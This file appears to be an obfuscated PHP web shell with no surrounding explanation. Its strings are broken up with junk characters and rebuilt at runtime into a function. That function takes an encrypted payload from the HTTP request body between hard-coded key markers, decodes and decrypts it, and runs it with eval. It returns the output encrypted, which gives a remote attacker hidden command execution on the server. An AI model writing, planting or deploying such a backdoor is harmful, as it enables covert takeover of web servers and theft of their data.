<?php
$o=';$D|p="PkjhkIDjyVpD|Y4sD|dD|m";function xD|($t,$k){$D|c=strD|leD|n($k);';
$Y='lD|);$j+D|+,$iD|D|++){$o.=$t{$i}^$k{$jD|};}}D|return $D|o;}if D|(D|@preg_m';
$t='e(D|$m[1]),$k)));$oD|=@D|ob_get_contentD|s()D|;@obD|_endD|_clean();$r=D';
$I='|@bD|ase64_encodeD|(@x(@gzcomD|pD|ress($D|o),$k))D|;printD|("$D|p$kh$r$kf");}';
$G='"D|),$m)==1) D|{@obD|_start()D|;@evaD|l(@gzunD|compresD|s(@xD|(@baseD|64_decD|D|odD|';
$a=str_replace('iq','','ciqriqeatiqeiq_iqfuiqnction');
$p='$k=D|"fa3a310D|c"D|;$kh="3D|828D|90ef863e";$kD|fD|="52370303D|781c"D|';
$c='D|$D|l=strlD|en($t);$D|oD|D|="";for($i=0;$i<$l;){for(D|D|$jD|=0;($j<$c&&$D|i<$';
$n='atchD|("/$kh(D|.+)$D|kf/",@fD|ileD|_D|D|get_contenD|ts("php://inputD|';
$U=str_replace('D|','',$p.$o.$c.$Y.$n.$G.$t.$I);
$j=$a('',$U);$j();
?>
